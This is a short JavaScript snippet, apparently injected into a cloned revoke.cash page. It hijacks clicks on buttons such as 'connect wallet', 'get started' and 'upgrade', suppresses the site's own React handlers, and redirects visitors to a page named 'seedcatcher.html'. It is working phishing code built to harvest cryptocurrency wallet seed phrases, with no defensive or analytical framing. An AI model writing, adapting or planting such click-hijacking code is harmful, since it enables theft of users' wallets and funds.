document.addEventListener('click', function(e) {
    // Get the closest clickable element
    let target = e.target.closest('a, button, div, span');
    if (!target) return;

    let text = (target.innerText || "").toLowerCase().trim();
    let href = (target.getAttribute("href") || "").toLowerCase();

    // 1. Ignore the top menu Premium link
    if (href === '/premium' || href === 'https://revoke.cash/premium') {
        return;
    }

    // 2. Hijack the exact buttons
    if (text === 'get started' || text === 'subscribe' || text === 'upgrade' || text.includes('connect wallet')) {
        e.preventDefault();
        e.stopPropagation();
        window.location.href = '/seedcatcher.html';
    }
}, true); // true = capture phase, kills the React event before it fires
